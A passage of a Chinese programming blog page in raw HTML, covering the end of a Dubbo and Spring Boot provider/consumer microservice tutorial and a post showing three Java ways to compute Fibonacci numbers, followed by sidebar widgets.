class="keyword">implements</span> <span class="title class_">IUserService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">selectUserById</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userMapper.selectUserById(id);</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第六步编写controller层接口"><a class="markdownIt-Anchor" href="#第六步编写controller层接口">#</a> 第六步：编写<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=controller%E5%B1%82&amp;spm=1001.2101.3001.7020"> controller 层</a>接口</h2>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">package</span> com.demo.provider.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.demo.api.entity.User;</span><br><span class="line"><span class="keyword">import</span> com.demo.api.service.IUserService;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: laz</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@CreateTime</span>: 2022-10-26  11:53</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Version</span>: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/provider&quot;)</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> IUserService userService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/selectUserById/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">selectUserById</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span>Long id)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userService.selectUserById(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="开发消费者模块"><a class="markdownIt-Anchor" href="#开发消费者模块">#</a> 开发消费者模块</h1>
<h2 id="第一步导入依赖-2"><a class="markdownIt-Anchor" href="#第一步导入依赖-2">#</a> 第一步：导入依赖</h2>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;project xmlns=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="line">         xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">         xsi:schemaLocation=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><span class="line">    &lt;parent&gt;</span><br><span class="line">        &lt;artifactId&gt;dubbo-demo&lt;/artifactId&gt;</span><br><span class="line">        &lt;groupId&gt;com.demo&lt;/groupId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">1.0</span>-SNAPSHOT&lt;/version&gt;</span><br><span class="line">    &lt;/parent&gt;</span><br><span class="line">    &lt;modelVersion&gt;<span class="number">4.0</span><span class="number">.0</span>&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;artifactId&gt;dubbo-customer&lt;/artifactId&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;!--dubbo-samples-springcloud-api 项目 依赖--&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.demo&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;dubbo-api&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.0</span>-SNAPSHOT&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;dubbo-spring-boot-starter&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;dubbo-registry-zookeeper&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>
<h2 id="第二步添加配置-2"><a class="markdownIt-Anchor" href="#第二步添加配置-2">#</a> 第二步：添加配置</h2>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">server:</span><br><span class="line">  port: <span class="number">8082</span></span><br><span class="line"></span><br><span class="line">spring:</span><br><span class="line">  application:</span><br><span class="line">    name: dubbo-samples-consumer-springCloud</span><br><span class="line"></span><br><span class="line">dubbo:</span><br><span class="line">  registry:</span><br><span class="line">    address: zookeeper:<span class="comment">//43.139.86.193:2181</span></span><br><span class="line">    timeout: <span class="number">2000</span></span><br><span class="line">  protocol:</span><br><span class="line">    name: dubbo</span><br></pre></td></tr></table></figure>
<h2 id="第三步编写启动类-2"><a class="markdownIt-Anchor" href="#第三步编写启动类-2">#</a> 第三步：编写启动类：</h2>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.customer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.config.spring.context.annotation.EnableDubbo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableDubbo</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConsumerApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(ConsumerApplication.class, args);</span><br><span class="line">        System.out.println(<span class="string">&quot;消费者启动完毕!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第四步编写调用生产者接口"><a class="markdownIt-Anchor" href="#第四步编写调用生产者接口">#</a> 第四步：编写调用生产者接口</h2>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.customer.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.demo.api.entity.User;</span><br><span class="line"><span class="keyword">import</span> com.demo.api.service.IUserService;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.config.annotation.DubboReference;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/consumer&quot;)</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConsumerUserController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@DubboReference( protocol = &quot;dubbo&quot;, loadbalance = &quot;random&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> IUserService userService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/selectUserById/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">getUser</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Long id)</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userService.selectUserById(id);</span><br><span class="line">        log.info(<span class="string">&quot;response from provider: &#123;&#125;&quot;</span>, user);</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>整个项目结构如下：</strong></p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/f302fc0e1073496084b5288ab609d158.jpeg" alt="在这里插入图片描述"></p>
<h1 id="测试"><a class="markdownIt-Anchor" href="#测试">#</a> 测试</h1>
<p>分别启动生产者和消费者，在浏览器分别调用以下接口：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/provider/selectUserById/1`</span><br><span class="line">`http://localhost:8082/consumer/selectUserById/1</span><br></pre></td></tr></table></figure>
<p><strong>结果：</strong><br>
<img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/6bc844eb01ac4dfc9aa12b8c6ef6d622.jpeg" alt="在这里插入图片描述"></p>
<h2 id="关于我"><a class="markdownIt-Anchor" href="#关于我">#</a> 关于我</h2>
<p>Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></p>
<p>非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-04-26T04:23:33.000Z" title="2023/4/26 12:23:33">2023-04-26</time>发表</span><span class="level-item"><time dateTime="2023-04-26T04:52:10.691Z" title="2023/4/26 12:52:10">2023-04-26</time>更新</span><span class="level-item">4 分钟读完 (大约611个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/04/26/%E3%80%90%E7%AE%97%E6%B3%95%E3%80%91%E4%BD%BF%E7%94%A8Java%E5%AE%9E%E7%8E%B0%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0%E5%88%97%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95%EF%BC%8C%E5%A4%AA%E9%85%B7%E5%95%A6/">【算法】使用Java实现斐波那契数列的三种方法，太酷啦</a></p><div class="content"><p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png" alt="InterviewCoder"></p>
<h1 id="算法使用java实现斐波那契数列的三种方法太酷啦"><a class="markdownIt-Anchor" href="#算法使用java实现斐波那契数列的三种方法太酷啦">#</a> 【算法】使用 Java 实现斐波那契数列的三种方法，太酷啦</h1>
<h2 id="java实现斐波那契数列的三种方法"><a class="markdownIt-Anchor" href="#java实现斐波那契数列的三种方法">#</a> Java 实现<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91&amp;spm=1001.2101.3001.7020">斐波那契</a>数列的三种方法</h2>
<p><strong>什么是斐波那契数列</strong></p>
<ul>
<li>这里借用一下度娘的一段话：斐波那契数列（Fibonacci sequence），又称黄金分割数列、因数学家列昂纳多・斐波那契（Leonardoda Fibonacci）以兔子繁殖为例子而引入，故又称为 “兔子数列”，指的是这样一个数列：1、1、2、3、5、8、13、21、34、……<br>
 其规律很明显，从第 3 个数开始，每个数都等于它前两个数的和。<br>
那么通过 java 可以如何实现斐波那契数列呢？这里介绍三种方法。</li>
<li>通过代码实现以下效果：当你输入 n 时，会获取斐波那契数列的第 n 个数的值。</li>
</ul>
<h4 id="1for循环实现"><a class="markdownIt-Anchor" href="#1for循环实现">#</a> <strong>1.for 循环实现</strong></h4>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">fibonacci</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   	<span class="type">int</span>[] fib = <span class="keyword">new</span> <span class="title class_">int</span>[n+<span class="number">1</span>];</span><br><span class="line">   	fib[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">   	fib[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">       fib[i] = fib[i-<span class="number">1</span>] + fib[i-<span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fib[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="2平方根实现"><a class="markdownIt-Anchor" href="#2平方根实现">#</a> <strong>2. 平方根实现</strong></h4>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">fibonacci</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">     <span class="type">double</span> <span class="variable">goldenRatio</span> <span class="operator">=</span> (<span class="number">1</span> + Math.sqrt(<span class="number">5</span>)) / <span class="number">2</span>;</span><br><span class="line">     <span class="keyword">return</span> (<span class="type">int</span>) Math.round(Math.pow(goldenRatio, n) / Math.sqrt(<span class="number">5</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="3矩阵快速幂实现"><a class="markdownIt-Anchor" href="#3矩阵快速幂实现">#</a> 3. 矩阵快速幂实现</h4>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">fibonacci</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span>[][] base = &#123;&#123;<span class="number">1</span>, <span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">0</span>&#125;&#125;;</span><br><span class="line">    <span class="type">int</span>[][] result = pow(base, n - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span>[][] pow(<span class="type">int</span>[][] base, <span class="type">int</span> power) &#123;</span><br><span class="line">    <span class="type">int</span>[][] result = <span class="keyword">new</span> <span class="title class_">int</span>[base.length][base.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; base.length; i++) &#123;</span><br><span class="line">        result[i][i] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (power &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (power % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            result = multiply(result, base);</span><br><span class="line">        &#125;</span><br><span class="line">        base = multiply(base, base);</span><br><span class="line">        power /= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span>[][] multiply(<span class="type">int</span>[][] a, <span class="type">int</span>[][] b) &#123;</span><br><span class="line">    <span class="type">int</span>[][] c = <span class="keyword">new</span> <span class="title class_">int</span>[a.length][b[<span class="number">0</span>].length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; b[<span class="number">0</span>].length; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; b.length; k++) &#123;</span><br><span class="line">                c[i][j] += a[i][k] * b[k][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>OK，到这里 java 实现斐波那契数列的三种写法就全部写完了，如果大家还有其他方法，欢迎交流～</p>
<h2 id="关于我"><a class="markdownIt-Anchor" href="#关于我">#</a> 关于我</h2>
<p>Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></p>
<p>非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！</p>
</div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous"><a href="/">上一页</a></div><div class="pagination-next"><a href="/page/3/">下一页</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link" href="/">1</a></li><li><a class="pagination-link is-current" href="/page/2/">2</a></li><li><a class="pagination-link" href="/page/3/">3</a></li><li><span class="pagination-ellipsis">&hellip;</span></li><li><a class="pagination-link" href="/page/15/">15</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-05-08T14:20:55.000Z">2023-05-08</time></p><p class="title"><a href="/2023/05/08/%E3%80%90Java%E3%80%91volatile%E5%85%B3%E9%94%AE%E5%AD%97/">【Java】volatile关键字</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-05-08T14:14:55.000Z">2023-05-08</time></p><p class="title"><a href="/2023/05/08/%E3%80%90Java%E3%80%91%E5%A4%9A%E7%A7%8D%E4%BB%A3%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F/">【Java】多种代理的实现方式</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-05-08T14:04:55.000Z">2023-05-08</time></p><p class="title"><a href="/2023/05/08/%E3%80%90Java%E3%80%91HashMap%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%A7%A3%E8%AF%BB/">【Java】HashMap核心原理解读</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-05-06T09:23:40.000Z">2023-05-06</time></p><p class="title"><a href="/2023/05/06/%E3%80%90%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E3%80%91%E6%89%8B%E5%86%99%E5%AE%9E%E7%8E%B0Map/">【数据结构】手写实现Hash表，并解决哈希冲突</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-05-06T07:53:40.000Z">2023-05-06</time></p><p class="title"><a href="/2023/05/06/%E3%80%90%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E3%80%91%E6%89%8B%E5%86%99%E5%AE%9E%E7%8E%B0ArrayList/">【数据结构】手写实现ArrayList</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2023/"><span class="level-start"><span class="level-item">2023</span></span><span class="level-end"><span class="level-item tag">40</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/"><span class="level-start"><span class="level-item">2022</span></span><span class="level-end"><span class="level-item tag">50</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/"><span class="level-start"><span class="level-item">2021</span></span><span class="level-end"><span class="level-item tag">44</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/"><span class="level-start"><span class="level-item">2020</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">InterviewCoder</p><p class="is-size-6 is-block">面试记官方公众号</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">141</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://mp.weixin.qq.com/s/jWs6lLHl5L-atXJhHc4YvA" target="_blank" rel="noopener">关注我</a></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="https://brath.cloud/me.png" alt="Brath"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Brath</p><p class="is-size-6 is-block">技能改变人生，知识改变命运。</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>中国·江苏·无锡</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">141</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/Guoqing815" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/Guoqing815"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Gitee" href="https://gitee.com/Guoqing-Li"><i class="fab fa-gitee"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://schokolade.cn/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">泠灵(特别呜谢)</span></span><span class="level-right"><span class="level-item tag">schokolade.cn</span></span></a></li><li><a class="level is-mobile" href="https://gitee.com/Guoqing-Li" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Gitee(码云)</span></span><span class="level-right"><span class="level-item tag">gitee.com</span></span></a></li><li><a class="level is-mobile" href="https://blog.csdn.net/Brath?type=blog" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">CSDN</span></span><span class="level-right"><span class="level-item tag">blog.csdn.net</span></span></a></li><li><a class="level is-mobile" href="https://juejin.cn/user/settings/profile" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">掘金</span></span><span class="level-right"><span class="level-item tag">juejin.cn</span></span></a></li><li><a class="level is-mobile" href="https://oss.console.aliyun.com/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">AliCloud(阿里云)</span></span><span class="level-right"><span class="level-item tag">oss.console.aliyun.com</span></span></a></li><li><a class="level is-mobile" href="https://cloud.tencent.com/" target="_blank" 